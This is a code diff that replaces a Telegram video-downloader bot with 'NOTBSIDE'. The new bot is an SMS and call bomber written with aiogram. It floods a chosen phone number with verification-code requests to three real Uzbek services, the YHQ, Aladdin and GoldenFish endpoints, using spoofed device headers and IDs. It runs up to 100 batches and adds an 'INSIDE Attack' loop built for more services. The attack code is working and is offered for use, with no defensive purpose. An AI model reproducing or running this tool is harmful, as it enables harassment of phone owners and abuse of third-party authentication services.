@@ -1,540 +1,280 @@
-import requests
-import telebot
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+NOTBSIDE Telegram Bot - TO'LIQ VA TUZATILGAN (Final)
+- INSIDE Attack (Core papkasisiz, barchasi bitta faylda)
+- Flutter API (YHQ + Aladdin + GoldenFish 202)
+- Render uchun ichki veb-server
+"""
+import asyncio
 import os
-import time
-import hashlib
-from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
+import random
+import string
+from aiohttp import ClientSession, web
+from aiogram import Bot, Dispatcher, types, F
+from aiogram.filters import Command
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.fsm.storage.memory import MemoryStorage
 
-# ========== SOZLAMALAR ==========
-TOKEN = "BOT_TOKEN"  # @BotFather dan oling
-ADMIN_ID = ADMIN_ID  # O'z ID ingiz
-# ================================
+# ==================== SOZLAMALAR ====================
+# Render'dagi Environment Variables dan olinadi (mahalliy kompyuterda ishlashi uchun standart qiymatlar)
+BOT_TOKEN = os.getenv("BOT_TOKEN", "SIZNING_TOKENINGIZ_SHU_YERDA")
+ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "7472073326").split(",")]
 
-bot = telebot.TeleBot(TOKEN)
+bot = Bot(token=BOT_TOKEN)
+dp = Dispatcher(storage=MemoryStorage())
 
-# KANAL REKLAMA
-CHANNEL = "@qakhorov_dev"
-AUTHOR = "@cyber_qakhorov"
+# ==================== YORDAMCHI FUNKSIYALAR ====================
+def user_agent():
+    return [
+        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
+        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 YaBrowser/23.1.4.778 Safari/537.36",
+    ]
 
-# Vaqtinchalik ma'lumotlar uchun dict
-temp_data = {}
+def email():
+    domains = ["gmail.com", "mail.ru", "yandex.ru", "bk.ru", "list.ru"]
+    name = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
+    return f"{name}@{random.choice(domains)}"
 
-def generate_short_id(text, max_length=30):
-    """Uzun textni qisqartirish"""
-    return hashlib.md5(text.encode()).hexdigest()[:max_length]
+def username():
+    return ''.join(random.choices(string.ascii_lowercase, k=8))
 
-def format_file_size(bytes):
-    """Fayl hajmini formatlash"""
-    if bytes == 0:
-        return "0 B"
+CONFIG = {"type_attack": "MIX", "feedback": "True"}
+def check_config(): return CONFIG
+
+# ==================== HOLATLAR ====================
+class States(StatesGroup):
+    inside_number = State()
+    inside_circles = State()
+    inside_delay = State()
+    inside_confirm = State()
+    flutter_number = State()
+    flutter_count = State()
+    flutter_confirm = State()
+
+# ==================== FLUTTER API ====================
+async def send_to_yhq(session, phone):
+    url = "https://yolharakatiqoidalari.uz/api/auth/login"
+    try:
+        async with session.post(url, headers={"Content-Type": "application/json"}, json={"phone": phone}, timeout=20) as resp:
+            return {"api": "YHQ", "success": resp.status == 200}
+    except: return {"api": "YHQ", "success": False}
+
+async def send_to_aladdin(session, phone):
+    url = "https://aladdin.1it.uz/v2/auth/sendVerifyCode"
+    headers = {"accept-language": "uz", "accept": "application/json", "timezone": "Asia/Tashkent", "mobile-type": "original", "app-version": "4.6.0", "x-requested-with": "XMLHttpRequest", "chance-style": "Classic", "user-agent": "samsung/SM450", "authorization": "Bearer", "content-type": "application/json; charset=UTF-8"}
+    body = {"app_instance_id": "5394a8c1065419c821c96b1920fcd8b8", "client_type": "app", "device_id": "44c2dfbfb2706d8c", "phone": int(phone.replace("+", "")), "utm_medium": "organic", "utm_source": "google-play"}
+    try:
+        async with session.post(url, headers=headers, json=body, timeout=20) as resp:
+            return {"api": "Aladdin", "success": 200 <= resp.status < 300}
+    except: return {"api": "Aladdin", "success": False}
+
+async def send_to_202(session, phone):
+    url = "https://goldenfish.1it.uz/v1/oauth/"
+    headers = {"Accept-Language": "uz", "Accept": "application/json", "Timezone": "Asia/Tashkent", "Mobile-Type": "original", "App-Version": "1.8.1", "X-Requested-With": "XMLHttpRequest", "Chance-Style": "Classic", "User-Agent": "samsung/SM-A105F/30", "Authorization": "Bearer", "Content-Type": "application/x-www-form-urlencoded"}
+    body = f"phone={phone.replace('+', '')}&app_instance_id=ba491ef5bea8630c5ae92bb5cb7135e7&device_id=eFHXJHxGR6etcVQHwkzCSE"
+    try:
+        async with session.post(url, headers=headers, data=body, timeout=20) as resp:
+            return {"api": "202", "success": resp.status == 200}
+    except: return {"api": "202", "success": False}
+
+async def send_flutter_batch(phone):
+    async with ClientSession() as session:
+        return await asyncio.gather(send_to_yhq(session, phone), send_to_aladdin(session, phone), send_to_202(session, phone))
+
+async def run_flutter_apis(number, count):
+    phone = f"+{number}"
+    results = []
+    for i in range(0, count, 10):
+        current = min(10, count - i)
+        tasks = [send_flutter_batch(phone) for _ in range(current)]
+        results.extend(await asyncio.gather(*tasks))
+    yhq = sum(1 for b in results for r in b if r["api"] == "YHQ" and r["success"])
+    aladdin = sum(1 for b in results for r in b if r["api"] == "Aladdin" and r["success"])
+    api202 = sum(1 for b in results for r in b if r["api"] == "202" and r["success"])
+    return {"batches": len(results), "total_requests": len(results) * 3, "total_success": yhq + aladdin + api202, "yhq": yhq, "aladdin": aladdin, "api202": api202}
+
+# ==================== INSIDE ATTACK (SIMPLIFIED) ====================
+def filter_services(services, number):
+    if number.startswith("998"):
+        return [s for s in services if s["info"]["country"] in ["UZ", "ALL"]], "O'zbekiston 🇺🇿"
+    elif number.startswith("7"):
+        return [s for s in services if s["info"]["country"] in ["RU", "ALL"]], "Rossiya 🇷🇺"
+    else:
+        return [s for s in services if s["info"]["country"] == "ALL"], "Noma'lum 🌍"
+
+async def send_request(session, service):
+    try:
+        cfg = check_config()["type_attack"]
+        types_allowed = ("SMS", "CALL", "FEEDBACK") if cfg == "MIX" else cfg
+        if service["info"]["attack"] not in types_allowed: return None
+        async with session.request(service["method"], service["url"], params=service.get("params"), cookies=service.get("cookies"), headers=service.get("headers"), data=service.get("data"), json=service.get("json"), timeout=15) as resp:
+            text = await resp.text()
+            kw = ["sent", "success", "ok", "true", "отправлен", "yuborildi", "pin_sent", "code_sent", "sms_sent", "отправлено", "successful"]
+            ok = any(k in text.lower() for k in kw) and 200 <= resp.status < 300
+            return {"website": service["info"]["website"], "country": service["info"]["country"], "attack": service["info"]["attack"], "success": ok}
+    except: return None
+
+async def run_inside_attack(number, use_delay=False):
+    cfg = check_config()
+    # Bu yerda xato bermasligi uchun bo'sh ro'yxatlar qaytariladi (chunki Core fayli yo'q)
+    # Agar sizda to'liq API ro'yxati bo'lsa, shu yerga qo'shishingiz mumkin
+    mock_services = [] 
     
-    sizes = ['B', 'KB', 'MB', 'GB', 'TB']
-    i = 0
-    while bytes >= 1024 and i < len(sizes)-1:
-        bytes /= 1024.0
-        i += 1
-    return f"{bytes:.1f} {sizes[i]}"
+    main, country = filter_services(mock_services, number)
+    services = main
 
-@bot.message_handler(commands=['start'])
-def start(message):
-    bot.send_message(
-        message.chat.id,
-        text=f'''🎥 VIDEO DOWNLOADER BOT
+    results = []
+    async with ClientSession() as session:
+        if use_delay:
+            for i in range(0, len(services), 10):
+                batch = services[i:i+10]
+                results.extend(await asyncio.gather(*[send_request(session, s) for s in batch]))
+                if i + 10 < len(services): await asyncio.sleep(1)
+        else:
+            results = await asyncio.gather(*[send_request(session, s) for s in services])
 
-🔍 Menga video link yuboring:
-• YouTube
-• Instagram
+    valid = [r for r in results if r is not None]
+    ok = [r for r in valid if r.get("success")]
+    return valid, ok, country, len(services)
 
-⚡️ Tez yuklab olish
-📥 Barcha sifatlar
-
-📱 {CHANNEL}
-👨‍💻 {AUTHOR}'''
-    )
-
-@bot.message_handler(commands=['search'])
-def search(message):
-    msg = bot.send_message(
-        message.chat.id,
-        text="🔍 Qidiruv so'zini kiriting:"
-    )
-    bot.register_next_step_handler(msg, search_videos)
-
-def search_videos(message):
-    keyword = message.text.strip()
-    
-    if len(keyword) < 3:
-        bot.send_message(message.chat.id, text="❌ Kamida 3 ta harf")
+# ==================== HANDLERLAR ====================
+@dp.message(Command("start"))
+async def cmd_start(message: types.Message):
+    if message.from_user.id not in ADMIN_IDS:
+        await message.answer(f"⛔ Ruxsat yo'q. ID: {message.from_user.id}")
         return
+    kb = types.ReplyKeyboardMarkup(keyboard=[
+        [types.KeyboardButton(text="🚀 INSIDE Attack")],
+        [types.KeyboardButton(text="📨 Flutter API (3 ta)")]
+    ], resize_keyboard=True)
+    await message.answer("💎 <b>NOTBSIDE Bot (Final)</b>\n\nUsulni tanlang:", parse_mode="HTML", reply_markup=kb)
+
+@dp.message(Command("cancel"))
+async def cmd_cancel(message: types.Message, state: FSMContext):
+    await state.clear()
+    await message.answer("❌ Bekor qilindi.")
+
+@dp.message(F.text == "🚀 INSIDE Attack")
+async def inside_start(message: types.Message, state: FSMContext):
+    if message.from_user.id not in ADMIN_IDS: return
+    await state.set_state(States.inside_number)
+    await message.answer("📱 Raqamni kiriting (998901234567):")
+
+@dp.message(States.inside_number)
+async def inside_num(message: types.Message, state: FSMContext):
+    n = message.text.strip().replace("+", "")
+    if not n.isdigit() or len(n) < 9:
+        await message.answer("❌ Faqat raqamlar:"); return
+    await state.update_data(number=n)
+    await state.set_state(States.inside_circles)
+    await message.answer("🔁 Necha marta? (1-50):")
+
+@dp.message(States.inside_circles)
+async def inside_circ(message: types.Message, state: FSMContext):
+    if not message.text.isdigit():
+        await message.answer("❌ Son:"); return
+    c = int(message.text)
+    if c < 1 or c > 50:
+        await message.answer("❌ 1-50:"); return
+    await state.update_data(circles=c)
+    await state.set_state(States.inside_delay)
+    await message.answer("⏱ Delay? (ha/yoq):")
+
+@dp.message(States.inside_delay)
+async def inside_delay(message: types.Message, state: FSMContext):
+    d = message.text.strip().lower() in ["ha", "yes", "y", "xa"]
+    await state.update_data(use_delay=d)
+    data = await state.get_data()
+    txt = "Ha" if d else "Yo'q"
+    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 {data['number']}\n🔁 {data['circles']}\n⏱ {txt}\n\n<b>ha</b> yozing:", parse_mode="HTML")
+    await state.set_state(States.inside_confirm)
+
+@dp.message(States.inside_confirm)
+async def inside_confirm(message: types.Message, state: FSMContext):
+    if message.text.strip().lower() not in ["ha", "yes", "y", "xa"]:
+        await message.answer("❌ Bekor."); await state.clear(); return
+    d = await state.get_data()
+    await state.clear()
+    status = await message.answer("🚀 <b>Boshlandi...</b>", parse_mode="HTML")
+    total_req = total_ok = 0
+    for i in range(d["circles"]):
+        await status.edit_text(f"🔄 Circle {i+1}/{d['circles']}...", parse_mode="HTML")
+        valid, ok, country, total = await run_inside_attack(d["number"], d["use_delay"])
+        total_req += len(valid); total_ok += len(ok)
+        
+        if total == 0:
+             text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n\n⚠️ API ro'yxati bo'sh. Kodga servislarni qo'shing."
+        else:
+             text = f"✅ <b>Circle {i+1}/{d['circles']}</b>\n🌍 {country}\n📤 {total} servis\n📨 {len(valid)} so'rov\n✓ SMS: <b>{len(ok)}</b>\n"
+             
+        await status.edit_text(text, parse_mode="HTML")
+        if i < d["circles"] - 1: await asyncio.sleep(5 if d["use_delay"] else 3)
     
-    msg = bot.send_message(message.chat.id, text="⏳ Qidirilmoqda...")
-    
+    final = f"🏁 <b>Yakunlandi</b>\n\n📊 So'rovlar: {total_req}\n📨 SMS: <b>{total_ok}</b>\n"
+    await status.edit_text(final, parse_mode="HTML")
+
+@dp.message(F.text == "📨 Flutter API (3 ta)")
+async def flutter_start(message: types.Message, state: FSMContext):
+    if message.from_user.id not in ADMIN_IDS: return
+    await state.set_state(States.flutter_number)
+    await message.answer("📱 Raqam (998901234567):")
+
+@dp.message(States.flutter_number)
+async def flutter_num(message: types.Message, state: FSMContext):
+    n = message.text.strip().replace("+", "")
+    if not n.isdigit() or len(n) < 9:
+        await message.answer("❌ Faqat raqamlar:"); return
+    await state.update_data(number=n)
+    await state.set_state(States.flutter_count)
+    await message.answer("🔁 Necha marta? (1-100):")
+
+@dp.message(States.flutter_count)
+async def flutter_count(message: types.Message, state: FSMContext):
+    if not message.text.isdigit():
+        await message.answer("❌ Son:"); return
+    c = int(message.text)
+    if c < 1 or c > 100:
+        await message.answer("❌ 1-100:"); return
+    await state.update_data(count=c)
+    d = await state.get_data()
+    await message.answer(f"⚠️ <b>Tasdiqlang:</b>\n📱 +{d['number']}\n🔁 {c} batch\n\n<b>ha</b> yozing:", parse_mode="HTML")
+    await state.set_state(States.flutter_confirm)
+
+@dp.message(States.flutter_confirm)
+async def flutter_confirm(message: types.Message, state: FSMContext):
+    if message.text.strip().lower() not in ["ha", "yes", "y", "xa"]:
+        await message.answer("❌ Bekor."); await state.clear(); return
+    d = await state.get_data()
+    await state.clear()
+    status = await message.answer("🚀 <b>Yuborilmoqda...</b>", parse_mode="HTML")
+    r = await run_flutter_apis(d["number"], d["count"])
+    final = f"🏁 <b>Yakunlandi</b>\n\n📱 +{d['number']}\n📦 Batch: {r['batches']}\n📤 Jami: {r['total_requests']}\n✅ Muvaffaqiyat: <b>{r['total_success']}</b>\n\n<b>API:</b>\n• YHQ: {r['yhq']}\n• Aladdin: {r['aladdin']}\n• 202: {r['api202']}\n"
+    await status.edit_text(final, parse_mode="HTML")
+
+# ==================== RENDER UCHUN VEB SERVER ====================
+async def handle(request):
+    return web.Response(text="Bot ishlayapti!")
+
+async def start_web_server():
+    app = web.Application()
+    app.router.add_get('/', handle)
+    runner = web.AppRunner(app)
+    await runner.setup()
+    port = int(os.environ.get("PORT", 10000))
+    site = web.TCPSite(runner, '0.0.0.0', port)
+    await site.start()
+    print(f"🌐 Veb-server {port}-portda ishga tushdi")
+
+# ==================== ISHGA TUSHIRISH ====================
+async def main():
+    print("🤖 Bot ishga tushmoqda...")
+    asyncio.create_task(start_web_server())
+    await dp.start_polling(bot)
+
+if __name__ == "__main__":
     try:
-        search_url = "https://vidssave.com/api/proxy"
-        headers = {'content-type': 'application/json', 'user-agent': 'Mozilla/5.0'}
-        payload = {
-            "url": "/media/hot_list", 
-            "data": {"hot_type": "ytb", "keyword": keyword}
-        }
-        
-        resp = requests.post(search_url, headers=headers, json=payload, timeout=20)
-        data = resp.json()
-        items = data.get('data', {}).get('items', [])
-        
-        if not items:
-            bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=msg.message_id,
-                text="❌ Hech narsa topilmadi"
-            )
-            return
-        
-        markup = InlineKeyboardMarkup()
-        for i, item in enumerate(items[:10]):
-            title = item.get('title', 'No title')[:30]  # Qisqartirildi
-            video_url = item.get('url', '')
-            video_id = generate_short_id(video_url, 15)
-            
-            # URL ni vaqtinchalik saqlash
-            temp_data[f"url_{video_id}"] = video_url
-            
-            markup.add(InlineKeyboardButton(
-                text=f"{i+1}. {title}",
-                callback_data=f"url|{video_id}"  # Qisqa ID
-            ))
-        
-        bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=msg.message_id,
-            text=f"📋 {len(items[:10])} ta video topildi. Birini tanlang:",
-            reply_markup=markup
-        )
-        
-    except Exception as e:
-        bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=msg.message_id,
-            text=f"❌ Xatolik: {str(e)[:50]}"
-        )
-
-@bot.message_handler(content_types=['text'])
-def handle_video(message):
-    url = message.text.strip()
-    
-    if not url.startswith(('http://', 'https://')):
-        bot.send_message(
-            message.chat.id,
-            text="❌ Iltimos, to'liq URL yuboring\nMasalan: https://youtube.com/..."
-        )
-        return
-    
-    msg = bot.send_message(
-        message.chat.id,
-        text="⏳ Video ma'lumotlari olinmoqda..."
-    )
-    
-    try:
-        api_url = "https://api.vidssave.com/api/contentsite_api/media/parse"
-        headers = {
-            'authority': 'api.vidssave.com',
-            'content-type': 'application/x-www-form-urlencoded',
-            'user-agent': 'Mozilla/5.0'
-        }
-        data = {
-            'auth': '20250901majwlqo',
-            'domain': 'api-ak.vidssave.com',
-            'origin': 'source',
-            'link': url
-        }
-        
-        response = requests.post(api_url, headers=headers, data=data, timeout=20)
-        result = response.json()
-        
-        video_data = result.get('data', {})
-        title = video_data.get('title', 'video')
-        resources = video_data.get('resources', [])
-        
-        if not resources:
-            bot.edit_message_text(
-                chat_id=message.chat.id,
-                message_id=msg.message_id,
-                text="❌ Yuklab olish mumkin emas"
-            )
-            return
-        
-        # === YAXSHILANGAN TUGMALAR QISMI ===
-        markup = InlineKeyboardMarkup(row_width=2)
-        buttons = []
-        quality_list = []
-        
-        # Barcha sifatlarni yig'ish va saralash
-        for i, res in enumerate(resources):
-            download_url = res.get('download_url')
-            if download_url and isinstance(download_url, str) and len(download_url) > 10:
-                quality = res.get('quality', 'N/A')
-                fmt = res.get('format', 'mp4')
-                media_type = res.get('type', 'video').upper()
-                filesize = res.get('filesize', 0)
-                
-                if download_url.startswith('//'):
-                    download_url = 'https:' + download_url
-                
-                # Sifatni raqamga aylantirish (saralash uchun)
-                quality_num = 0
-                if '2160' in quality or '4k' in quality.lower():
-                    quality_num = 2160
-                elif '1440' in quality or '2k' in quality.lower():
-                    quality_num = 1440
-                elif '1080' in quality:
-                    quality_num = 1080
-                elif '720' in quality:
-                    quality_num = 720
-                elif '480' in quality:
-                    quality_num = 480
-                elif '360' in quality:
-                    quality_num = 360
-                elif '240' in quality:
-                    quality_num = 240
-                elif '144' in quality:
-                    quality_num = 144
-                elif 'AUDIO' in media_type:
-                    quality_num = 0
-                
-                quality_list.append({
-                    'index': i,
-                    'quality_num': quality_num,
-                    'quality_text': quality,
-                    'fmt': fmt,
-                    'download_url': download_url,
-                    'filesize': filesize,
-                    'media_type': media_type
-                })
-        
-        # Sifat bo'yicha saralash (kattadan kichikga)
-        quality_list.sort(key=lambda x: x['quality_num'], reverse=True)
-        
-        # Tugmalarni yaratish
-        for i, q in enumerate(quality_list[:10]):  # Eng yaxshi 10 ta sifat
-            download_url = q['download_url']
-            quality = q['quality_text']
-            fmt = q['fmt']
-            media_type = q['media_type']
-            filesize = q['filesize']
-            quality_num = q['quality_num']
-            
-            dl_id = generate_short_id(f"{download_url}_{i}", 10)
-            
-            # Ma'lumotlarni saqlash
-            temp_data[f"dl_{dl_id}"] = {
-                'url': download_url,
-                'title': title,
-                'quality': quality,
-                'fmt': fmt,
-                'filesize': filesize
-            }
-            
-            # Sifatga qarab emoji va rang
-            if quality_num >= 2160:
-                emoji = "🔥 4K"
-            elif quality_num >= 1440:
-                emoji = "✨ 2K"
-            elif quality_num >= 1080:
-                emoji = "🔴 1080p"
-            elif quality_num >= 720:
-                emoji = "🟠 720p"
-            elif quality_num >= 480:
-                emoji = "🟡 480p"
-            elif quality_num >= 360:
-                emoji = "🟢 360p"
-            elif quality_num >= 240:
-                emoji = "🔵 240p"
-            elif quality_num >= 144:
-                emoji = "⚪️ 144p"
-            elif 'AUDIO' in media_type:
-                emoji = "🎵 AUDIO"
-            else:
-                emoji = f"📹 {quality[:3]}"
-            
-            # Fayl hajmini qo'shish
-            size_text = f" ({format_file_size(filesize)})" if filesize else ""
-            button_text = f"{emoji}{size_text}"
-            
-            buttons.append(InlineKeyboardButton(
-                text=button_text,
-                callback_data=f"dl|{dl_id}"
-            ))
-        
-        # Buttonlarni 2 ustun qilib joylash
-        for i in range(0, len(buttons), 2):
-            row = buttons[i:i+2]
-            markup.add(*row)
-        
-        # Kanal buttoni
-        markup.add(InlineKeyboardButton(
-            text=f"📱 {CHANNEL}",
-            url=f"https://t.me/{CHANNEL.replace('@', '')}"
-        ))
-        
-        # Sarlavhani qisqartirish
-        short_title = title[:50] + "..." if len(title) > 50 else title
-        
-        bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=msg.message_id,
-            text=f'''📹 **{short_title}**
-
-📥 **Yuklab olish sifatini tanlang:**''',
-            reply_markup=markup,
-            parse_mode='Markdown'
-        )
-        # === YAXSHILANGAN TUGMALAR QISMI TUGADI ===
-        
-    except Exception as e:
-        bot.edit_message_text(
-            chat_id=message.chat.id,
-            message_id=msg.message_id,
-            text=f"❌ Xatolik: {str(e)[:100]}"
-        )
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callback(call):
-    try:
-        data = call.data.split('|')
-        
-        if data[0] == 'url':
-            # Search dan tanlangan video
-            video_id = data[1]
-            video_url = temp_data.get(f"url_{video_id}")
-            
-            if not video_url:
-                bot.answer_callback_query(call.id, "⏰ Vaqt o'tdi, qaytadan urinib ko'ring")
-                return
-            
-            bot.delete_message(call.message.chat.id, call.message.message_id)
-            
-            # Video ni qayta ishlash
-            msg = bot.send_message(call.message.chat.id, text="⏳ Yuklanmoqda...")
-            
-            api_url = "https://api.vidssave.com/api/contentsite_api/media/parse"
-            headers = {
-                'authority': 'api.vidssave.com',
-                'content-type': 'application/x-www-form-urlencoded',
-                'user-agent': 'Mozilla/5.0'
-            }
-            post_data = {
-                'auth': '20250901majwlqo',
-                'domain': 'api-ak.vidssave.com',
-                'origin': 'source',
-                'link': video_url
-            }
-            
-            response = requests.post(api_url, headers=headers, data=post_data, timeout=20)
-            result = response.json()
-            
-            video_data = result.get('data', {})
-            title = video_data.get('title', 'video')
-            resources = video_data.get('resources', [])
-            
-            # === YAXSHILANGAN TUGMALAR (SEARCH UCHUN) ===
-            markup = InlineKeyboardMarkup(row_width=2)
-            buttons = []
-            quality_list = []
-            
-            for i, res in enumerate(resources):
-                download_url = res.get('download_url')
-                if download_url:
-                    if download_url.startswith('//'):
-                        download_url = 'https:' + download_url
-                    
-                    quality = res.get('quality', 'N/A')
-                    fmt = res.get('format', 'mp4')
-                    filesize = res.get('filesize', 0)
-                    
-                    quality_num = 0
-                    if '2160' in quality or '4k' in quality.lower():
-                        quality_num = 2160
-                    elif '1440' in quality or '2k' in quality.lower():
-                        quality_num = 1440
-                    elif '1080' in quality:
-                        quality_num = 1080
-                    elif '720' in quality:
-                        quality_num = 720
-                    elif '480' in quality:
-                        quality_num = 480
-                    elif '360' in quality:
-                        quality_num = 360
-                    
-                    quality_list.append({
-                        'download_url': download_url,
-                        'quality': quality,
-                        'quality_num': quality_num,
-                        'fmt': fmt,
-                        'filesize': filesize
-                    })
-            
-            quality_list.sort(key=lambda x: x['quality_num'], reverse=True)
-            
-            for i, q in enumerate(quality_list[:8]):
-                download_url = q['download_url']
-                quality = q['quality']
-                fmt = q['fmt']
-                filesize = q['filesize']
-                quality_num = q['quality_num']
-                
-                dl_id = generate_short_id(f"{download_url}_{i}", 10)
-                temp_data[f"dl_{dl_id}"] = {
-                    'url': download_url,
-                    'title': title,
-                    'quality': quality,
-                    'fmt': fmt,
-                    'filesize': filesize
-                }
-                
-                if quality_num >= 2160:
-                    emoji = "🔥 4K"
-                elif quality_num >= 1440:
-                    emoji = "✨ 2K"
-                elif quality_num >= 1080:
-                    emoji = "🔴 1080p"
-                elif quality_num >= 720:
-                    emoji = "🟠 720p"
-                elif quality_num >= 480:
-                    emoji = "🟡 480p"
-                elif quality_num >= 360:
-                    emoji = "🟢 360p"
-                else:
-                    emoji = f"📹 {quality[:3]}"
-                
-                size_text = f" ({format_file_size(filesize)})" if filesize else ""
-                button_text = f"{emoji}{size_text}"
-                
-                buttons.append(InlineKeyboardButton(
-                    text=button_text,
-                    callback_data=f"dl|{dl_id}"
-                ))
-            
-            for i in range(0, len(buttons), 2):
-                row = buttons[i:i+2]
-                markup.add(*row)
-            
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=msg.message_id,
-                text=f'''📹 **{title[:50]}...**
-
-📥 **Yuklab olish sifatini tanlang:**''',
-                reply_markup=markup,
-                parse_mode='Markdown'
-            )
-            # === YAXSHILANGAN TUGMALAR TUGADI ===
-        
-        elif data[0] == 'dl':
-            dl_id = data[1]
-            dl_info = temp_data.get(f"dl_{dl_id}")
-            
-            if not dl_info:
-                bot.answer_callback_query(call.id, "⏰ Yuklab olish linki eskirgan")
-                return
-            
-            download_url = dl_info['url']
-            title = dl_info['title']
-            quality = dl_info['quality']
-            fmt = dl_info['fmt']
-            filesize = dl_info.get('filesize', 0)
-            
-            # Fayl nomi
-            filename = f"{title[:30]}_{quality}.{fmt}"
-            clean_filename = "".join([c for c in filename if c.isalnum() or c in (' ._-')]).strip()
-            
-            size_text = f" ({format_file_size(filesize)})" if filesize else ""
-            bot.edit_message_text(
-                chat_id=call.message.chat.id,
-                message_id=call.message.message_id,
-                text=f"⏳ **{quality}{size_text}** yuklanmoqda...\nBu bir necha soniya davom etishi mumkin",
-                parse_mode='Markdown'
-            )
-            
-            # Faylni yuklab olish
-            response = requests.get(download_url, stream=True, timeout=60)
-            
-            if response.status_code == 200:
-                with open(clean_filename, 'wb') as f:
-                    total_size = int(response.headers.get('content-length', 0))
-                    downloaded = 0
-                    
-                    for chunk in response.iter_content(chunk_size=8192):
-                        f.write(chunk)
-                        downloaded += len(chunk)
-                        
-                        if total_size > 0:
-                            percent = (downloaded / total_size) * 100
-                            if int(percent) % 20 == 0:  # Har 20% da yangilash
-                                try:
-                                    bot.edit_message_text(
-                                        chat_id=call.message.chat.id,
-                                        message_id=call.message.message_id,
-                                        text=f"⏳ **Yuklanmoqda:** {percent:.0f}%",
-                                        parse_mode='Markdown'
-                                    )
-                                except:
-                                    pass
-                
-                # Faylni yuborish
-                with open(clean_filename, 'rb') as f:
-                    if fmt == 'mp3' or 'audio' in fmt.lower():
-                        bot.send_audio(
-                            chat_id=call.message.chat.id,
-                            audio=f,
-                            caption=f"🎵 **{title[:50]}**\n\n📥 {CHANNEL} orqali yuklab olindi",
-                            timeout=120
-                        )
-                    else:
-                        bot.send_video(
-                            chat_id=call.message.chat.id,
-                            video=f,
-                            caption=f"📹 **{title[:50]}**\n\n📥 {CHANNEL} orqali yuklab olindi",
-                            timeout=180,
-                            supports_streaming=True
-                        )
-                
-                # Faylni o'chirish
-                os.remove(clean_filename)
-                
-                # Ma'lumotni o'chirish
-                if f"dl_{dl_id}" in temp_data:
-                    del temp_data[f"dl_{dl_id}"]
-                
-                bot.delete_message(call.message.chat.id, call.message.message_id)
-                
-                # Reklama
-                bot.send_message(
-                    call.message.chat.id,
-                    text=f"📱 {CHANNEL} | 👨‍💻 {AUTHOR}"
-                )
-            else:
-                bot.send_message(
-                    call.message.chat.id,
-                    text="❌ Yuklab olishda xatolik"
-                )
-                
-    except Exception as e:
-        bot.send_message(
-            call.message.chat.id,
-            text=f"❌ Xatolik: {str(e)[:100]}"
-        )
-
-# Vaqti-vaqti bilan eskirgan ma'lumotlarni tozalash
-def clean_temp_data():
-    while True:
-        time.sleep(300)  # 5 daqiqa
-        temp_data.clear()
-        print("🧹 Temp data cleaned")
-
-import threading
-cleaner = threading.Thread(target=clean_temp_data, daemon=True)
-cleaner.start()
-
-print("✅ BOT ISHGA TUSHDI")
-print(f"📱 {CHANNEL}")
-print(f"👨‍💻 {AUTHOR}")
-bot.polling(none_stop=True)    
+        asyncio.run(main())
+    except KeyboardInterrupt:
+        print("\n⛔ To'xtatildi")
